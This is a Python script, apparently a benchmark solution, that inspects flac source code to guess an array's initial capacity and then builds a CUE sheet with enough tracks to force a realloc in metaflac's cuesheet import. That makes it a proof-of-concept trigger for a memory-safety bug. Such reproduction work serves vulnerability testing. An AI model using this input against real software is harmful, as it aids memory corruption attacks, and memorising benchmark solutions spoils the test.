import os
import re
import tarfile
from typing import List, Tuple, Optional


class Solution:
    def _iter_text_files_from_tar(self, src_path: str):
        with tarfile.open(src_path, mode="r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name
                lower = name.lower()
                if not (lower.endswith(".c") or lower.endswith(".h") or lower.endswith(".cc") or lower.endswith(".cpp")):
                    continue
                if m.size <= 0 or m.size > 2_000_000:
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                except Exception:
                    continue
                try:
                    text = data.decode("utf-8", errors="ignore")
                except Exception:
                    continue
                yield name, text

    def _score_candidate(self, file_name: str, text: str, var: str) -> int:
        score = 0
        lname = file_name.lower()
        ltext = text.lower()
        lvar = var.lower()

        if "metaflac" in lname or "metaflac" in ltext:
            score += 4
        if "cuesheet" in lname or "cuesheet" in ltext or "import_cuesheet" in ltext:
            score += 3
        if "operation" in lvar or "op" in lvar:
            score += 2
        if "cap" in lvar:
            score += 2
        if "realloc" in ltext or "malloc" in ltext:
            score += 1
        return score

    def _extract_capacity_candidates(self, file_name: str, text: str) -> List[Tuple[int, int]]:
        cands: List[Tuple[int, int]] = []

        # Ternary growth: cap = cap ? cap*2 : BASE
        for m in re.finditer(
            r'([A-Za-z_]\w*)\s*=\s*\1\s*\?\s*\1\s*\*\s*2\s*:\s*(\d+)\s*;',
            text
        ):
            var = m.group(1)
            base = int(m.group(2))
            if 2 <= base <= 256:
                cands.append((base, self._score_candidate(file_name, text, var) + 3))

        # if (!cap) cap = BASE;
        for m in re.finditer(
            r'if\s*\(\s*!\s*([A-Za-z_]\w*)\s*\)\s*\1\s*=\s*(\d+)\s*;',
            text
        ):
            var = m.group(1)
            base = int(m.group(2))
            if 2 <= base <= 256:
                cands.append((base, self._score_candidate(file_name, text, var) + 1))

        # if (0 == cap) cap = BASE;
        for m in re.finditer(
            r'if\s*\(\s*0\s*==\s*([A-Za-z_]\w*)\s*\)\s*\1\s*=\s*(\d+)\s*;',
            text
        ):
            var = m.group(1)
            base = int(m.group(2))
            if 2 <= base <= 256:
                cands.append((base, self._score_candidate(file_name, text, var) + 1))

        # #define SOME_INITIAL_CAPACITY BASE
        for m in re.finditer(
            r'^\s*#\s*define\s+([A-Za-z_]\w*(?:OP|OPER|OPERATION|OPERATIONS)\w*(?:CAP|CAPACITY)\w*)\s+(\d+)\s*$',
            text,
            flags=re.MULTILINE
        ):
            var = m.group(1)
            base = int(m.group(2))
            if 2 <= base <= 256:
                cands.append((base, self._score_candidate(file_name, text, var)))

        # Heuristic: cap = BASE; near realloc and operation keywords
        if ("realloc" in text or "malloc" in text) and ("operation" in text.lower() or "operations" in text.lower()):
            for m in re.finditer(
                r'([A-Za-z_]\w*(?:op|oper|operation|operations)\w*(?:cap|capacity)\w*)\s*=\s*(\d+)\s*;',
                text,
                flags=re.IGNORECASE
            ):
                var = m.group(1)
                base = int(m.group(2))
                if 2 <= base <= 256:
                    cands.append((base, self._score_candidate(file_name, text, var)))

        return cands

    def _infer_initial_capacity(self, src_path: str) -> Optional[int]:
        best_base = None
        best_score = -10

        try:
            for fname, text in self._iter_text_files_from_tar(src_path):
                cands = self._extract_capacity_candidates(fname, text)
                for base, score in cands:
                    # Prefer small realistic initial capacities commonly used in dynamic arrays
                    size_bonus = 0
                    if base in (4, 8, 16, 32):
                        size_bonus = 2
                    elif 2 <= base <= 64:
                        size_bonus = 1
                    total_score = score + size_bonus
                    if total_score > best_score or (total_score == best_score and best_base is not None and base < best_base):
                        best_score = total_score
                        best_base = base
        except Exception:
            return None

        return best_base

    def _time_from_frames(self, frames: int) -> str:
        mm = frames // (75 * 60)
        ss = (frames // 75) % 60
        ff = frames % 75
        return f"{mm:02d}:{ss:02d}:{ff:02d}"

    def _generate_cue(self, n_tracks: int) -> bytes:
        if n_tracks < 1:
            n_tracks = 1
        if n_tracks > 99:
            n_tracks = 99

        out = []
        out.append('FILE "a" WAVE\n')
        for i in range(1, n_tracks + 1):
            out.append(f"TRACK {i:02d} AUDIO\n")
            out.append(f"INDEX 01 {self._time_from_frames(i - 1)}\n")
        return "".join(out).encode("ascii", errors="ignore")

    def solve(self, src_path: str) -> bytes:
        cap = self._infer_initial_capacity(src_path)
        if cap is None:
            cap = 8

        # Need enough seekpoint-appending operations to force at least one realloc after the cuesheet op handle is stored.
        # Total ops ~= 1 (cuesheet op) + N (seekpoint ops) => force realloc by making N >= initial_capacity.
        n_tracks = cap

        # Safety minimum in case the parsed capacity isn't the relevant one or additional ops exist.
        if n_tracks < 5:
            n_tracks = 5

        # Keep reasonably small while still likely to exceed any small initial capacity.
        if n_tracks > 40:
            n_tracks = 40

        return self._generate_cue(n_tracks)